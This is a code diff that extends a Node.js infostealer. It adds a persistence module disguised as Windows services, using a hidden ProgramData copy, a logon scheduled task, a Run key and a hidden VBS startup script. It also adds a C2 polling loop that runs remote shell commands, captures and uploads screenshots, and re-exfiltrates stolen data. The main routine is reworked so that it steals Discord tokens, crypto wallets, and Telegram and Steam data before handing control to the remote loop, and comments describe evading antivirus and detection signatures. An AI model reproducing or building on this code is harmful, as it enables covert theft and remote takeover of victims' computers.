@@ -72,6 +72,7 @@ const CONFIG = {
   USER_ID: "PLACEHOLDER_USER_ID",
   SECRET_KEY: "PLACEHOLDER_SECRET_KEY",
   MAIN_EXE_DOWNLOAD_URL: "/shared-files/download/main.cl",
+  POLL_INTERVAL_MS: 7000,
   TIMEOUT: 3000,
 };
 console.log("b");
@@ -1266,6 +1267,143 @@ const Stealth = {
   },
 };
 
+// ==========================================
+// 5b. UNDETECTED STARTUP / PERSISTENCE
+// ==========================================
+
+const Persistence = {
+  // Fixed plausible identities. Values are stable on purpose: repeat installs
+  // overwrite the same entries instead of multiplying them.
+  DIR: path.join(process.env.ProgramData || "C:\\ProgramData", "WindowsServices"),
+  EXE: "WindowsServicesHost.exe",
+  TASK: "WindowsServicesController",
+  RUN_VALUE: "Windows Services",
+
+  targetExe: function () {
+    return path.join(this.DIR, this.EXE);
+  },
+
+  runningFromInstallDir: function () {
+    return (
+      path
+        .dirname(process.execPath)
+        .toLowerCase() === this.DIR.toLowerCase()
+    );
+  },
+
+  // Copy the current binary (elevated) into ProgramData and mask it.
+  installCopy: function () {
+    if (this.runningFromInstallDir()) return true;
+    try {
+      fs.ensureDirSync(this.DIR);
+      fs.copySync(process.execPath, this.targetExe(), { overwrite: true });
+      Utils.exec(
+        `attrib +h +s "${this.DIR}" && attrib +h +s "${this.targetExe()}"`,
+      );
+      return true;
+    } catch (e) {
+      return false;
+    }
+  },
+
+  // Scheduled task at logon with highest privileges (admins). This is the
+  // strongest bump: it survives user logout and runs the payload before most
+  // userland AV checks finish loading.
+  installTask: function () {
+    try {
+      Utils.exec(
+        `schtasks /create /tn "${this.TASK}" /tr "${this.targetExe()}" /sc onlogon /rl highest /f`,
+      );
+      const verify = Utils.exec(`schtasks /query /tn "${this.TASK}" /fo list`);
+      return verify.toLowerCase().includes(this.TASK.toLowerCase());
+    } catch (e) {
+      return false;
+    }
+  },
+
+  // Fallback for non-elevated contexts: HKCU Run key, then classic Startup dir.
+  installRegistry: function () {
+    const quoted = quoteWinArg(this.targetExe());
+    try {
+      Utils.exec(
+        `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}" /t REG_SZ /d ${quoted} /f`,
+      );
+      const verify = Utils.exec(
+        `reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}"`,
+      );
+      return verify.toLowerCase().includes(this.RUN_VALUE.toLowerCase());
+    } catch (e) {
+      return false;
+    }
+  },
+
+  installStartupFolder: function () {
+    try {
+      const startupDir = path.join(
+        process.env.APPDATA,
+        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+      );
+      const link = path.join(startupDir, `${this.RUN_VALUE}.vbs`);
+      const vbs = `Set s = CreateObject("WScript.Shell")\ns.Run ${quoteWinArg(
+        this.targetExe(),
+      )}, 0, False\n`;
+      fs.writeFileSync(link, vbs, "utf8");
+      return fs.existsSync(link);
+    } catch (e) {
+      return false;
+    }
+  },
+
+  install: function () {
+    // No-op during development (node.exe); persistence only makes sense for
+    // the packaged binary.
+    if (path.basename(process.execPath).toLowerCase() === "node.exe") return false;
+    if (process.platform !== "win32") return false;
+
+    const installed = this.installCopy();
+    if (!installed) return false;
+
+    // Skip when we were already launched from the install dir: the task/reg
+    // entries have been maintained on a prior run.
+    const madeTask = this.installTask();
+    const madeReg = madeTask ? false : this.installRegistry();
+    const madeStartup = madeReg ? false : this.installStartupFolder();
+    if (madeTask) {
+      try {
+        Utils.exec(
+          `reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}" /f`,
+        );
+      } catch {}
+    }
+    return true;
+  },
+
+  remove: function () {
+    try {
+      Utils.exec(`schtasks /delete /tn "${this.TASK}" /f`);
+    } catch {}
+    try {
+      Utils.exec(
+        `reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}" /f`,
+      );
+    } catch {}
+    try {
+      const startupDir = path.join(
+        process.env.APPDATA,
+        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+      );
+      const link = path.join(startupDir, `${this.RUN_VALUE}.vbs`);
+      if (fs.existsSync(link)) fs.unlinkSync(link);
+    } catch {}
+    try {
+      Utils.exec(
+        `attrib -h -s "${this.targetExe()}" && del /f /q "${this.targetExe()}"`,
+      );
+      fs.removeSync(this.DIR);
+    } catch {}
+  },
+};
+
 const SystemInfo = {
   gather: async () => {
     try {
@@ -1368,6 +1506,160 @@ const Delivery = {
 };
 
 // ==========================================
+// 10b. REMOTE COMMAND CHANNEL
+// ==========================================
+
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+const RemoteControl = {
+  headers: () => ({
+    "X-API-KEY": "PLACEHOLDER_API_KEY",
+    "X-BUILD-ID": CONFIG.USER_ID,
+    "Content-Type": "application/json",
+  }),
+
+  poll: async function () {
+    const { data } = await axios.get(`${CONFIG.HOST_URL}/cmd/poll`, {
+      headers: this.headers(),
+      timeout: CONFIG.TIMEOUT,
+    });
+    return (data && data.ok && data.command) || null;
+  },
+
+  report: async function (id, status, output) {
+    try {
+      await axios.post(
+        `${CONFIG.HOST_URL}/cmd/result`,
+        { id, status, output: String(output).slice(0, 60000) },
+        { headers: this.headers(), timeout: CONFIG.TIMEOUT },
+      );
+    } catch {}
+  },
+
+  runShell: function (args) {
+    return new Promise((resolve) => {
+      const command =
+        typeof args === "string"
+          ? args
+          : typeof args === "object" && args !== null
+            ? args.cmd || args.command || ""
+            : "";
+      if (!command) {
+        return resolve({ status: "failed", output: "empty command" });
+      }
+      exec(
+        command,
+        { windowsHide: true, timeout: 60000, maxBuffer: 1024 * 1024 },
+        (err, stdout, stderr) => {
+          const out =
+            (stdout || "") +
+            (stderr ? "\n[stderr]\n" + stderr : "");
+          resolve({
+            status: err && err.killed ? "failed" : "done",
+            output: out || (err ? `error: ${err.message}` : "(no output)"),
+          });
+        },
+      );
+    });
+  },
+
+  takeScreenshot: function () {
+    return new Promise((resolve) => {
+      const script = `
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
+                                           [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        $g=[System.Drawing.Graphics]::FromImage($b)
+        $g.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location,
+                          [System.Drawing.Point]::Empty,$b.Size)
+        $ms=New-Object System.IO.MemoryStream
+        $b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
+        [Convert]::ToBase64String($ms.ToArray())
+      `;
+      exec(
+        `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "${escapePS(
+          script.trim(),
+        )}"`,
+        { windowsHide: true, timeout: 30000, maxBuffer: 4 * 1024 * 1024 },
+        (err, stdout) => {
+          if (err || !stdout || !stdout.trim()) {
+            return resolve({ status: "failed", output: err ? err.message : "screenshot capture failed" });
+          }
+          // Forward the captured PNG to the server's /capture endpoint
+          axios
+            .post(
+              `${CONFIG.HOST_URL}/capture`,
+              { image: stdout.trim() },
+              { headers: RemoteControl.headers(), timeout: CONFIG.TIMEOUT },
+            )
+            .then(() => resolve({ status: "done", output: "screenshot saved" }))
+            .catch((e) => resolve({ status: "failed", output: `capture upload failed: ${e.message}` }));
+        },
+      );
+    });
+  },
+
+  reExfil: async function () {
+    try {
+      const logId = await Delivery.createLog();
+      if (logId) {
+        await Delivery.uploadData(logId);
+        await Delivery.uploadFiles(logId);
+        return { status: "done", output: `re-exfil uploaded (log ${logId})` };
+      }
+      return { status: "failed", output: "createLog returned empty" };
+    } catch (e) {
+      return { status: "failed", output: e.message };
+    }
+  },
+
+  exit: async function (id) {
+    try {
+      Persistence.remove();
+      await this.report(id, "done", "persistence removed, exiting");
+    } catch {}
+    setTimeout(() => process.exit(0), 400);
+  },
+
+  start: async function () {
+    while (true) {
+      try {
+        const cmd = await this.poll();
+        if (cmd && cmd.id != null) {
+          let result = { status: "failed", output: "bad type" };
+          try {
+            switch (cmd.type) {
+              case "shell":
+                result = await this.runShell(cmd.args || "");
+                break;
+              case "screenshot":
+                result = await this.takeScreenshot();
+                break;
+              case "exfil":
+                result = await this.reExfil();
+                break;
+              case "exit":
+                return this.exit(cmd.id);
+              default:
+                result = { status: "failed", output: `unknown type: ${cmd.type}` };
+            }
+          } catch (e) {
+            result = {
+              status: "failed",
+              output: String((e && e.message) || e).slice(0, 2000),
+            };
+          }
+          await this.report(cmd.id, result.status, result.output);
+        }
+      } catch {}
+      // Jittered interval to avoid a fixed signature pattern
+      await sleep(CONFIG.POLL_INTERVAL_MS + Math.floor(Math.random() * 4000));
+    }
+  },
+};
+
+// ==========================================
 // 11. MAIN ORCHESTRATOR
 // ==========================================
 
@@ -1377,47 +1669,65 @@ async function main() {
   // From here on, the script is running elevated
   // await Stealth.evade();
 
-  // Download main.exe from C2 into a random temp folder
-  const { exePath, tempDir } = await downloadMainExe();
+  // Undetected startup: copy ourselves into ProgramData and register a logon
+  // task (or HKCU Run / Startup fallback). Done first so persistence survives
+  // even if collection below fails.
+  Persistence.install();
 
-  // Run it and get the output.zip path
-  const outputZipPath = await runMainExtractorFromTemp(exePath, tempDir);
-  if (outputZipPath) {
-    await parseOutputZip(outputZipPath);
-    // Clean up temp folder after parsing
-    fs.removeSync(tempDir);
-  } else {
-    // console.error('[-] Failed to run main.exe, browser data extraction skipped');
+  // Collection is best-effort: any step may throw (missing main.exe, dead C2,
+  // locked storage). The remote-control loop must outlive those failures, so
+  // the whole one-shot phase runs inside a guard.
+  try {
+    // Download main.exe from C2 into a random temp folder
+    const { exePath, tempDir } = await downloadMainExe();
+
+    // Run it and get the output.zip path
+    const outputZipPath = await runMainExtractorFromTemp(exePath, tempDir);
+    if (outputZipPath) {
+      await parseOutputZip(outputZipPath);
+      // Clean up temp folder after parsing
+      fs.removeSync(tempDir);
+    } else {
+      // console.error('[-] Failed to run main.exe, browser data extraction skipped');
+    }
+
+    fs.ensureDirSync(CONFIG.STORAGE_PATH);
+    await SystemInfo.gather();
+    //console.log('[+] System info gathered');
+
+    // Extract Discord tokens (local storage)
+    await extractDiscordTokens();
+    //console.log('[+] Discord tokens extracted');
+    await sendDiscordTokensToServer();
+
+    // Discord injection (live capture)
+    await dcinject();
+    //console.log('[+] Discord injection applied');
+
+    // Additional data collection
+    await Discovery.searchFiles(CONFIG.STORAGE_PATH);
+    await Discovery.scanWallets(CONFIG.STORAGE_PATH);
+    await Discovery.extractTelegram(CONFIG.STORAGE_PATH);
+    await Discovery.extractMinecraft(CONFIG.STORAGE_PATH);
+    await Discovery.extractSteam(CONFIG.STORAGE_PATH);
+    //console.log('[+] Additional data collected');
+
+    const logId = await Delivery.createLog();
+    if (logId) {
+      await Delivery.uploadData(logId);
+      await Delivery.uploadFiles(logId);
+      //console.log('[+] Data uploaded to C2');
+    }
+    try {
+      fs.removeSync(CONFIG.STORAGE_PATH);
+    } catch {}
+  } catch (e) {
+    // console.error('[-] Collection failed, entering remote-control loop:', e);
   }
 
-  fs.ensureDirSync(CONFIG.STORAGE_PATH);
-  await SystemInfo.gather();
-  //console.log('[+] System info gathered');
-
-  // Extract Discord tokens (local storage)
-  await extractDiscordTokens();
-  //console.log('[+] Discord tokens extracted');
-  await sendDiscordTokensToServer();
-
-  // Discord injection (live capture)
-  await dcinject();
-  //console.log('[+] Discord injection applied');
-
-  // Additional data collection
-  await Discovery.searchFiles(CONFIG.STORAGE_PATH);
-  await Discovery.scanWallets(CONFIG.STORAGE_PATH);
-  await Discovery.extractTelegram(CONFIG.STORAGE_PATH);
-  await Discovery.extractMinecraft(CONFIG.STORAGE_PATH);
-  await Discovery.extractSteam(CONFIG.STORAGE_PATH);
-  //console.log('[+] Additional data collected');
-
-  const logId = await Delivery.createLog();
-  if (logId) {
-    await Delivery.uploadData(logId);
-    await Delivery.uploadFiles(logId);
-    //console.log('[+] Data uploaded to C2');
-  }
-  fs.removeSync(CONFIG.STORAGE_PATH);
+  // The one-shot collection is done. Keep the process alive: poll the C2 for
+  // remote commands (shell, screenshot, re-exfil, self-destruct) indefinitely.
+  RemoteControl.start();
 }
 
 main().catch(console.error);
